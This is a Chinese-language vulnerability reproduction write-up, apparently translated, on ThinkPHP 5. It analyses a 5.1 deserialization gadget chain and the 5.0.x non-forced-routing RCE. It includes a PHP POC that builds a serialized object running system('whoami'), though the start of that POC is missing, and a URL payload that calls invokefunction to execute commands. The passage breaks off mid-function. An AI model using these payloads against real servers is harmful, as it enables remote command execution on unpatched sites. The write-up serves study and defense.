# ThinkPHP V5 漏洞复现
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 0x00 ThinkPHP V5.1反序列化
###  0x00 项目安装
使用composer部署TP项目,创建一个名为TP51的TP项目  
`composer create-project --prefer-dist topthink/think tp51 5.1.*`
TP框架入口文件为{安装目录}/public/index.php，使用apache部署后访问入口文件显示TP欢迎界面即安装成功。
###  0x01 演示版本
ThinkPHP v5.1.41  
PHP: php 7.3.4  
OS：Windows10
###  0x02 源码分析
**准备**
首先得准备一个反序列化的入口  
可以直接在 `public/index.php` 中添加如下代码对输入进行反序列化
    if (isset($_GET['data'])) {
        $data=$_GET['data'];
        unserialize(base64_decode($data));
    } else {
        highlight_file(__FILE__);
    }
**分析**
起始位置在 `think\process\pipes\Windows` 类的 `__destruct()` 方法内调用的
`$this->removeFiles()`。
    public function __destruct()
    {
        $this->close();
        $this->removeFiles();
    }
该函数的作用是删除文件，但是这里用来判断文件是否存在的函数 `file_exists()` 的参数如果是一个对象，会触发它的 `__toString()`
方法。
    private function removeFiles()
    {
        foreach ($this->files as $filename) {
            if (file_exists($filename)) {
                @unlink($filename);
            }
        }
        $this->files = [];
    }
这里可以利用 `think\model\concern\Conversion` 类，但是这是一个trait，不能实例化，所以还要找一个使用了它的类，如
`think\Model` ，但这是一个抽象类，所以又接着找到了它的实现类
`think\model\Pivot`。解决了trait的问题，那就接着跟进调用的函数 `toJson()`，接着调用 `toArray()`。
    public function __toString()
    {
        return $this->toJson();
    }
    public function toJson($options = JSON_UNESCAPED_UNICODE)
    {
        return json_encode($this->toArray(), $options);
    }
`toArray()` 截图了关键代码，这里的 `$this->append` 可控。
    if (!empty($this->append)) {
        foreach ($this->append as $key => $name) {
            if (is_array($name)) {
                // 追加关联对象属性
                $relation = $this->getRelation($key);
                if (!$relation) {
                    $relation = $this->getAttr($key);
                    if ($relation) {
                        $relation->visible($name);
                    }
                }
                $item[$key] = $relation ? $relation->append($name)->toArray() : [];
            }
        }
    }
定位到 `getRelation()` ，只要使得 `$this->getRelation($key)` 返回值为False，就接着调用
`$this->getAttr($key)`。
    public function getRelation($name = null)
    {
        if (is_null($name)) {
            return $this->relation;
        } elseif (array_key_exists($name, $this->relation)) {
            return $this->relation[$name];
        }
        return;
    }
截取前面部分代码，这里的 `$closure($value, $this->data)` ，如果 `$closure` 和 `$value`
可控的话，那么我们就可以执行任意命令。
`$closure = $this->withAttr[$fieldName];` ，调用的函数名由 `$this->withAttr` 以及
`$fieldName` 决定，`$this->withAttr` 可控，而 `$fieldName` 由 `$this->append`
的键名决定。函数定了，参数 `$value` 回溯看一下，等于 `$this->getData($name)`
    public function getAttr($name, &$item = null)
    {
        try {
            $notFound = false;
            $value    = $this->getData($name);
        } catch (InvalidArgumentException $e) {
            $notFound = true;
            $value    = null;
        }
        // 检测属性获取器
        $fieldName = Loader::parseName($name);
        $method    = 'get' . Loader::parseName($name, 1) . 'Attr';
        if (isset($this->withAttr[$fieldName])) {
            if ($notFound && $relation = $this->isRelationAttr($name)) {
                $modelRelation = $this->$relation();
                $value         = $this->getRelationData($modelRelation);
            }
            $closure = $this->withAttr[$fieldName];
            $value   = $closure($value, $this->data);
        }
    }
函数的返回值可以由 `$this->data[$name]` 决定，也是可控。
    public function getData($name = null)
    {
        if (is_null($name)) {
            return $this->data;
        } elseif (array_key_exists($name, $this->data)) {
            return $this->data[$name];
        } elseif (array_key_exists($name, $this->relation)) {
            return $this->relation[$name];
        }
        throw new InvalidArgumentException('property not exists:' . static::class . '->' . $name);
    }
那么就可以写出POC了
    files=[new Pivot()];
            }
        }
    }
    namespace think\model{
        use think\Model;
        class Pivot extends Model
        {
        }
    }
    namespace think{
        abstract class Model
        {
            private $data = [];
            private $withAttr = [];
            protected $append = ['so4ms'=>[]];
            public function __construct()
            {
                $this->relation = false;
                $this->data = ['so4ms'=>'whoami'];
                $this->withAttr = ['so4ms'=>'system'];
            }
        }
    }
    namespace {
        use think\process\pipes\Windows;
        $windows = new Windows();
        echo base64_encode(serialize($windows))."\n";
    }
## 0x01 ThinkPHP5 未开启强制路由RCE
###  0x00 影响范围
> ThinkPHP 5.0.5-5.0.22  
>  ThinkPHP 5.1.0-5.1.30
###  0x01 演示版本
ThinkPHP v5.0.15  
PHP: php 7.3.4  
环境：Windows10
###  0x02 payload
调试分析时选用的是
`?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami`
###  0x03 触发条件
`application\config.php` 两个所需条件如下：
    // PATHINFO变量名 用于兼容模式
    'var_pathinfo'           => 's',
    // 是否强制使用路由
    'url_route_must'         => false,
###  0x04 调试分析
入口函数 `think\App` 中的 `run()` 函数，在 `routeCheck()` 处打下断点，跟进。
    // 未设置调度信息则进行 URL 路由检测
    if (empty($dispatch)) {
        $dispatch = self::routeCheck($request, $config);
    }
在 `routeCheck()` 中先调用了 `path()` 函数来获取路由，跟进一下 `path()` 函数。
    $path   = $request->path();
又接着跟进 `$this->pathinfo()`
    $pathinfo = $this->pathinfo();
此时的 `$this->pathinfo` 默认为null，进入if，然后开始获取 `config.php` 中的设置 `'var_pathinfo'`
，因此之前得有 `'var_pathinfo' => 's',` 才能进一步往下。然后通过
`$_GET[Config::get('var_pathinfo')]` 获取我们传入的路由信息。
此时进入下一个if，由于上面已经获取了 `$_SERVER['PATH_INFO']` ，不满足条件，所以跳过了这个if。返回
`index/\think\app/invokefunction`。
    public function pathinfo()
    {
        if (is_null($this->pathinfo)) {
            if (isset($_GET[Config::get('var_pathinfo')])) {
                // 判断URL里面是否有兼容模式参数
                $_SERVER['PATH_INFO'] = $_GET[Config::get('var_pathinfo')];
                unset($_GET[Config::get('var_pathinfo')]);
            } elseif (IS_CLI) {
                // CLI模式下 index.php module/controller/action/params/...
                $_SERVER['PATH_INFO'] = isset($_SERVER['argv'][1]) ? $_SERVER['argv'][1] : '';
            }
            // 分析PATHINFO信息
            if (!isset($_SERVER['PATH_INFO'])) {
                foreach (Config::get('pathinfo_fetch') as $type) {
                    if (!empty($_SERVER[$type])) {
                        $_SERVER['PATH_INFO'] = (0 === strpos($_SERVER[$type], $_SERVER['SCRIPT_NAME'])) ?
                            substr($_SERVER[$type], strlen($_SERVER['SCRIPT_NAME'])) : $_SERVER[$type];
                        break;
                    }
                }
            }
            $this->pathinfo = empty($_SERVER['PATH_INFO']) ? '/' : ltrim($_SERVER['PATH_INFO'], '/');
        }
        return $this->pathinfo;
    }
回到 `path()` 函数，这里的 `$suffix` 值默认为 `html` ，进入第一个 elseif。去掉 `html`
，由于我们的请求中没有，所以没任何影响，返回 `index/\think\app/invokefunction`。
    public function path()
    {
        if (is_null($this->path)) {
            $suffix   = Config::get('url_html_suffix');
            $pathinfo = $this->pathinfo();
            if (false === $suffix) {
                // 禁止伪静态访问
                $this->path = $pathinfo;
            } elseif ($suffix) {
                // 去除正常的URL后缀
                $this->path = preg_replace('/\.(' . ltrim($suffix, '.') . ')$/i', '', $pathinfo);
            } else {
                // 允许任何后缀访问
                $this->path = preg_replace('/\.' . $this->ext() . '$/i', '', $pathinfo);
            }
        }
        return $this->path;
    }
回到 `routeCheck()`，这里先对路由进行了检测，返回为false，然后对 `config.php` 中的 `url_route_must`
进行了判断，之前已经确认了为false，不开启强制路由，否则的话下面就会抛出错误，也就无法继续利用了。
    // 路由检测（根据路由定义返回不同的URL调度）
    $result = Route::check($request, $path, $depr, $config['url_domain_deploy']);
    $must   = !is_null(self::$routeMust) ? self::$routeMust : $config['url_route_must'];
然后在下面，由于 `$result` 值为false，所以调用了 `parseUrl` 来对输入进行解析。
    // 路由无效 解析模块/控制器/操作/参数... 支持控制器自动搜索
    if (false === $result) {
        $result = Route::parseUrl($path, $depr, $config['controller_auto_search']);
    }
这里url的 `/` 被替换为了 `|` ，然后我们跟进 `parseUrlPath()`。
    $url              = str_replace($depr, '|', $url);
    list($path, $var) = self::parseUrlPath($url);
这里又把 `|` 换回了 `/` ，然后根据 `/` 将url切割为了三部分：模块/控制器/操作。
    /**
     * 解析URL的pathinfo参数和变量
     * @access private
     * @param string    $url URL地址
     * @return array
     */
    private static function parseUrlPath($url)
    {
        // 分隔符替换 确保路由定义使用统一的分隔符
        $url = str_replace('|', '/', $url);
        $url = trim($url, '/');
        $var = [];
        if (false !== strpos($url, '?')) {
            // [模块/控制器/操作?]参数1=值1&参数2=值2...
            $info = parse_url($url);
            $path = explode('/', $info['path']);
            parse_str($info['query'], $var);
        } elseif (strpos($url, '/')) {
            // [模块/控制器/操作]
            $path = explode('/', $url);
        } else {
            $path = [$url];
        }
        return [$path, $var];
    }
然后回到 `parseUrl` ，然后分别获取模块、控制器、操作，最后返回了 `['type' => 'module', 'module' =>
$route]`。
    public static function parseUrl($url, $depr = '/', $autoSearch = false)
    {
        if (isset(self::$bind['module'])) {
            $bind = str_replace('/', $depr, self::$bind['module']);
            // 如果有模块/控制器绑定
            $url = $bind . ('.' != substr($bind, -1) ? $depr : '') . ltrim($url, $depr);
        }
        $url              = str_replace($depr, '|', $url);
        list($path, $var) = self::parseUrlPath($url);
        $route            = [null, null, null];
        if (isset($path)) {
            // 解析模块
            $module = Config::get('app_multi_module') ? array_shift($path) : null;
            if ($autoSearch) {